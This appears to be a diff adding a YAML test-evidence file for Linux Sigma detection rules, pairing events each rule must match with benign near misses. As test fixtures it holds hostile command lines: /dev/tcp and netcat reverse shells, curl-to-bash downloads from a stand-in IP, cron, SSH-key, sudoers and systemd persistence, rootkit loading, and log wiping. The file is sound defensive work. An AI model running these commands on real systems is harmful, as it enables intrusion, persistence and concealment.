@@ -1,0 +1,238 @@
+# Evidence that the Linux rules fire, and that they do not fire on the thing
+# they most resemble.
+#
+# Keyed by rule filename. `tests/test_sigma_evidence.py` requires an entry for
+# every rule and a rule for every entry, so a rule cannot be added without
+# something that proves it works.
+#
+# `matches`  events the rule MUST fire on.
+# `ignores`  the near miss - the benign command an analyst would confuse it
+#            with. A rule with no `ignores` is a rule nobody has thought about
+#            in the direction that produces 3am pages.
+# `also_fires` other rules this event legitimately trips. Anything not listed
+#            here and firing anyway is a failure, so an overlap is a decision
+#            somebody wrote down rather than an accident.
+
+linux_audit_tampering:
+  matches:
+    - name: audit rules flushed
+      event:
+        Image: /usr/sbin/auditctl
+        CommandLine: auditctl -D
+  ignores:
+    - name: listing the audit rules
+      event:
+        Image: /usr/sbin/auditctl
+        CommandLine: auditctl -l
+  also_fires: []
+
+linux_container_escape:
+  matches:
+    - name: a container given the docker socket
+      event:
+        CommandLine: docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
+  ignores:
+    - name: an ordinary container
+      event:
+        CommandLine: docker run -d --name web -p 80:80 nginx
+  also_fires: []
+
+linux_cron_persistence:
+  matches:
+    - name: a job appended to /etc/crontab
+      event:
+        CommandLine: "/bin/sh -c echo '* * * * * root /tmp/.x.sh' >> /etc/crontab"
+  ignores:
+    - name: reading the crontab
+      event:
+        CommandLine: cat /etc/crontab
+  also_fires: []
+
+linux_download_piped_to_shell:
+  matches:
+    - name: an installer piped straight into bash
+      event:
+        CommandLine: "/bin/sh -c curl -fsSL http://198.51.100.7/i.sh | bash"
+  ignores:
+    - name: downloaded to a file rather than executed
+      event:
+        CommandLine: curl -fsSL -o /tmp/i.sh http://198.51.100.7/i.sh
+  also_fires: []
+
+linux_history_cleared:
+  matches:
+    - name: shell history removed
+      event:
+        CommandLine: /bin/rm -f /root/.bash_history
+  ignores:
+    - name: an ordinary log read
+      event:
+        CommandLine: grep -i failed /var/log/auth.log
+  also_fires: []
+
+linux_kernel_module_loaded:
+  matches:
+    - name: a module loaded out of /tmp
+      event:
+        CommandLine: insmod /tmp/diamorphine.ko
+  ignores:
+    - name: a packaged module
+      event:
+        CommandLine: modprobe overlay
+  also_fires: []
+
+linux_ld_preload:
+  matches:
+    - name: a preloaded shared object
+      event:
+        CommandLine: LD_PRELOAD=/dev/shm/.libhide.so /usr/bin/id
+  ignores:
+    - name: inspecting linkage
+      event:
+        CommandLine: ldd /usr/bin/id
+  also_fires: []
+
+linux_reverse_shell:
+  matches:
+    - name: a bash reverse shell over /dev/tcp
+      event:
+        CommandLine: "/bin/bash -c bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"
+    - name: netcat handed a shell to run
+      event:
+        CommandLine: nc -e /bin/sh 198.51.100.7 4444
+    - name: ncat, the same thing under its other name
+      event:
+        CommandLine: /usr/bin/ncat -e /bin/bash 198.51.100.7 4444
+  ignores:
+    - name: a port check
+      event:
+        CommandLine: nc -zv db.internal 5432
+    # The one that was firing. `contains|all: ['nc ', '-e']` found both
+    # substrings inside `-enc `, so every encoded PowerShell command line
+    # matched this Linux netcat rule.
+    - name: encoded powershell, which is a different rule's business
+      event:
+        CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA
+    - name: a word that merely ends in nc
+      event:
+        CommandLine: /usr/bin/rsync -e ssh /srv/data backup:/srv/data
+  also_fires: []
+
+linux_ssh_key_added:
+  matches:
+    - name: a key appended to authorized_keys
+      event:
+        CommandLine: "/bin/sh -c echo 'ssh-ed25519 AAAAC3Nz attacker' >> /root/.ssh/authorized_keys"
+  ignores:
+    - name: reading known_hosts
+      event:
+        CommandLine: cat /home/deploy/.ssh/known_hosts
+  also_fires: []
+
+linux_sudoers_modified:
+  matches:
+    - name: passwordless sudo granted
+      event:
+        CommandLine: "/bin/sh -c echo 'svc ALL=(ALL) NOPASSWD: ALL' | tee /etc/sudoers.d/svc"
+  ignores:
+    - name: listing your own rights
+      event:
+        CommandLine: sudo -l
+  also_fires: []
+
+linux_suid_backdoor:
+  matches:
+    - name: the suid bit set on a staged shell
+      event:
+        CommandLine: chmod u+s /tmp/bash
+  ignores:
+    - name: an ordinary mode change
+      event:
+        CommandLine: chmod 755 /usr/local/bin/deploy
+  also_fires: []
+
+linux_systemd_unit_persistence:
+  matches:
+    - name: a unit file written into place
+      event:
+        CommandLine: "/bin/sh -c tee /etc/systemd/system/update.service"
+  ignores:
+    - name: checking a unit
+      event:
+        CommandLine: systemctl status nginx.service
+  also_fires: []
+
+linux_capability_backdoor:
+  matches:
+    - name: setuid capability granted to python
+      event:
+        CommandLine: setcap cap_setuid+ep /usr/bin/python3.11
+    - name: module loading granted to a staged binary
+      event:
+        CommandLine: /sbin/setcap cap_sys_module+ep /tmp/loader
+  ignores:
+    - name: reading the capabilities of a binary
+      event:
+        CommandLine: getcap /usr/bin/python3.11
+    - name: a harmless capability a package grants itself
+      event:
+        CommandLine: setcap cap_net_bind_service=+ep /usr/sbin/nginx
+  also_fires: []
+
+linux_log_wiped:
+  matches:
+    - name: the login record truncated
+      event:
+        CommandLine: /usr/bin/truncate -s 0 /var/log/wtmp
+    - name: the authentication log removed
+      event:
+        CommandLine: /bin/rm -f /var/log/auth.log
+    - name: the journal vacuumed to nothing
+      event:
+        CommandLine: journalctl --vacuum-time=1s
+  ignores:
+    - name: reading the authentication log
+      event:
+        CommandLine: grep -i "failed password" /var/log/auth.log
+    - name: rotating logs the ordinary way
+      event:
+        CommandLine: /usr/sbin/logrotate -s /var/lib/logrotate/status /etc/logrotate.conf
+  also_fires: []
+
+linux_shell_profile_persistence:
+  matches:
+    - name: a command appended to the user's bashrc
+      event:
+        CommandLine: "/bin/sh -c echo 'curl -s http://198.51.100.7/x | sh' >> /home/deploy/.bashrc"
+    - name: a script dropped into the system profile directory
+      event:
+        CommandLine: "/bin/sh -c tee /etc/profile.d/update.sh"
+  ignores:
+    - name: reading a profile
+      event:
+        CommandLine: cat /home/deploy/.bashrc
+    - name: sourcing it, which every login does
+      event:
+        CommandLine: /bin/bash --login
+  # The line being appended is itself a download piped into a shell, so both
+  # rules are right about it: one says how it persists, the other says what it
+  # will do every time it runs.
+  also_fires:
+    - linux_download_piped_to_shell
+
+linux_sshd_config_weakened:
+  matches:
+    - name: root login re-enabled
+      event:
+        CommandLine: "/bin/sh -c echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
+    - name: keys served by a command instead of a file
+      event:
+        CommandLine: "/bin/sh -c echo 'AuthorizedKeysCommand /tmp/.keys.sh' >> /etc/ssh/sshd_config"
+  ignores:
+    - name: reading the configuration
+      event:
+        CommandLine: grep -i permitrootlogin /etc/ssh/sshd_config
+    - name: restarting the daemon after an ordinary change
+      event:
+        CommandLine: systemctl reload sshd
+  also_fires: []
